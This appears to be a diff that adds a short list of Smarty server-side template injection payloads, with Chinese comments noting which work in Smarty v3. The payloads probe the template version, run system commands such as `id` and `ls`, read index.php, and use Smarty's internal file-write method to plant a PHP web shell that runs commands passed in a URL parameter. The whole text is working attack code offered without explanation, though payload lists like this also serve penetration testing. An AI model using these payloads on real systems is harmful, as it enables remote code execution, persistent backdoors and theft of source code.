@@ -1,0 +1,5 @@
+{$smarty.version}
+{php}echo `id`;{/php}       //smarty v3中已弃用
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')}              //兼容v3
+{system('cat index.php')}   //兼容v3
